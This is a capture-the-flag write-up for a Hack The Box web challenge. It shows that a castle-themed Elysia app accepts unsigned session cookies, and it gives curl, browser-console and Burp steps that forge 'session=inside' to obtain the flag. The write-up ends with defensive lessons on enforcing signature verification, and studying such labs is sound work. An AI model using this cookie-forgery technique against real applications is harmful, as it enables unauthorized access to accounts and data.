# Web Challenge — Broken Authentication via Unsigned Cookie Acceptance

**Platform:** Hack The Box CTF  
**Category:** Web  
**Difficulty:** Practitioner  

## Objective

"Lysa Harrowmere reaches Crownspire with proof that a trusted castle informant is selling patrol routes to the enemy. The information is being used to ambush messengers, delay supplies, and keep Stormbound’s allies divided. The only person who can act on the proof is inside the castle for a closed council, but Lysa’s name has been removed from the entry list and the guards have orders to admit no unscheduled visitors. If she waits, the council ends and the traitor disappears with the next route packet. If she speaks openly at the gate, the proof is seized before it reaches the right hands. Lysa must trick the guarded passage, get inside, and place the evidence with the one ally who can expose the leak before the enemy moves again." 

A castle-themed web application requires authentication and physical movement through a gate to retrieve a flag. Goal: bypass the authentication mechanism and obtain the flag.

## Initial Reconnaissance

Opening the application revealed a game interface with a message: "Reach the gate. Higher privilege required." The page source referenced an external JavaScript bundle which, when read, exposed the full client-side logic
including every API endpoint the application uses:

- `GET /api/me` — check current session state
- `POST /api/login` — authenticate with username and password
- `POST /api/gate/enter` — transition session to 'inside' state
- `POST /api/gate/open` — open the gate (admin only)
- `POST /api/flag` — retrieve the flag (requires 'inside' session)
- `POST /api/logout` — destroy session

The challenge provided source files including `app/index.ts` — the complete
backend. Reading it before testing anything was the correct first move.

## Source Code Analysis

The backend uses signed cookies for session management:

```typescript
const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],
    sign: [sessionCookie]
  }
})
```

The intent is that the session cookie is cryptographically signed on the
server and any tampered or unsigned cookie should be rejected. The session
value is a plain string — either `'admin'` or `'inside'` — set by the server
after authentication.

The admin password is generated at startup:

```typescript
const adminPassword = randomBytes(24).toString('base64url')
```

24 random bytes — brute force is not viable.

The `/api/flag` endpoint checks only one condition:

```typescript
if (session.value !== 'inside') {
  set.status = 403
  return { ok: false, message: 'Enter the castle first' }
}
return { ok: true, flag }
```

No role check. No admin check. Just `session.value === 'inside'`.

## Identifying the Vulnerability

The critical question: does Elysia actually reject unsigned cookies, or does
it silently accept them and populate `session.value` anyway?

**Test 1 — no cookie:**

```bash
curl -X POST http://TARGET/api/gate/enter -v
```

Response: `401 Unauthorized` — `{"ok":false,"message":"Login required"}`

The `!session.value` check fires, confirming the endpoint is reached and
session handling runs.

**Test 2 — unsigned cookie with forged value:**

```bash
curl -X POST http://TARGET/api/gate/enter -H "Cookie: session=inside" -v
```

Response: `200 OK` — `{"ok":true,"insideGate":true}`

The server accepted an unsigned, manually crafted cookie and treated `session.value` as `'inside'`. Signature verification was configured but not enforced — the framework accepted raw cookie values without validating
the signature.

The server also returned a properly signed cookie in the response:

```
set-cookie: session=inside.hn2yi6WpHDZVlGz597RvfZDD%2FWa5pyuWuCeG6T6SMDE
```

## Exploit

**Step 1 — Forge the inside session:**

```bash
curl -X POST http://TARGET/api/gate/enter \
  -H "Cookie: session=inside" -v
```

Server responds with a signed `inside` session cookie.

**Step 2 — Call /api/flag with the signed cookie:**

```bash
curl -X POST http://TARGET/api/flag \
  -H "Cookie: session=inside.hn2yi6WpHDZVlGz597RvfZDD%2FWa5pyuWuCeG6T6SMDE" -v
```

Response:

```json
{"ok":true,"flag":"HTB{...}"}
```

## Alternative Path — Admin Session

Sending `session=admin` as an unsigned cookie also passes the checks in `/api/gate/enter` and `/api/me`, since both accept either `'admin'` or `'inside'`. With an `admin` session the gate opens in the frontend and the
character can walk through — but `/api/flag` specifically requires `'inside'`, not `'admin'`. The complete exploit chain regardless of path is:

```
Forge session=admin OR authenticate legitimately
      ↓
Call /api/gate/enter → server sets signed 'inside' cookie
      ↓
Call /api/flag with 'inside' cookie → flag returned
```

## Seeing the Exploit in the Frontend

To observe the visual effect without legitimate credentials, paste the signed cookie into the browser console:

```javascript
document.cookie = "session=inside.SIGNED_VALUE; path=/"
```

Refresh the page. The character spawns inside the castle. Walk to the NPC and click "Ask for flag" to trigger `/api/flag` through the game UI.

## Using Burp Suite for This Exploit

Intercept any request to the application in Burp Proxy, send it to Repeater, change the method to `POST` and the path to `/api/gate/enter`, replace the Cookie header with `Cookie: session=inside`, send. The signed cookie arrives in the response pane. Copy it, change the path to `/api/flag`, send again. No frontend required — the raw API responses are the exploit surface.

## Vulnerability Classification

**API2:2023 — Broken Authentication**

Initially I thought this was a BOLA (Broken Object Level Authorization accessing another user's objects by manipulating IDs). It is not. No object
IDs were manipulated and no user's data was accessed beyond its intended scope in the BOLA sense.

The actual failure is authentication: the server configured cookie signing to prevent session forgery but did not enforce verification on incoming requests.
An attacker can supply any string as `session.value` and the server treats it as a legitimate authenticated session. The authentication mechanism is broken at the verification step.

Root cause: the Elysia framework's cookie signing was enabled for outgoing cookies but incoming cookie signature validation was either misconfigured or not enforced at the middleware level.

## Data Flow

```
Attacker sends unsigned Cookie: session=inside
      ↓
Elysia receives cookie — signature check not enforced
      ↓
session.value === 'inside' → passes all checks in /api/gate/enter
      ↓
Server issues legitimately signed 'inside' session cookie
      ↓
POST /api/flag with signed cookie → flag returned
```

## Lessons Learned

- Read the source code before interacting with the application. The vulnerability was obvious once I inspected `index.ts`.
- Having a security feature isn't enough—it has to be enforced. The application signed cookies but never verified incoming signatures.
- Always understand what an application actually checks. The flag endpoint only validated the session state, not the user's role.
- Start with simple tools. `curl` was enough to test the hypothesis before switching to Burp Suite for easier iteration.
- When reviewing authentication, verify both sides of the process: token generation **and** token validation.
- Source code review can reveal logic flaws much faster than black-box testing when the code is available.
- This challenge is a good example of **Broken Authentication** caused by incorrect implementation rather than weak cryptography.
